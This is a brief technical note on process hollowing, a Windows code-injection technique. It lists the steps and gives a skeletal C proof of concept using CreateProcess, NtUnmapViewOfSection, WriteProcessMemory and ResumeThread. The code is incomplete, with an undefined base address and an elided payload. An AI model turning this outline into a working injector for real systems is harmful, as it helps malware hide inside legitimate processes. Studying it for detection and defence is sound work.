Process hollowing:
1. **Steps**:
   - Create suspended process (`CreateProcess` with `CREATE_SUSPENDED`).
   - Unmap legitimate memory (`NtUnmapViewOfSection`).
   - Inject malicious code.
2. **PoC**:
   ```c
   #include <windows.h>
   void hollow() {
       PROCESS_INFORMATION pi;
       STARTUPINFO si = { sizeof(si) };
       CreateProcess(NULL, "target.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
       NtUnmapViewOfSection(pi.hProcess, base_addr);
       WriteProcessMemory(pi.hProcess, ...);
       ResumeThread(pi.hThread);
   }
   ```
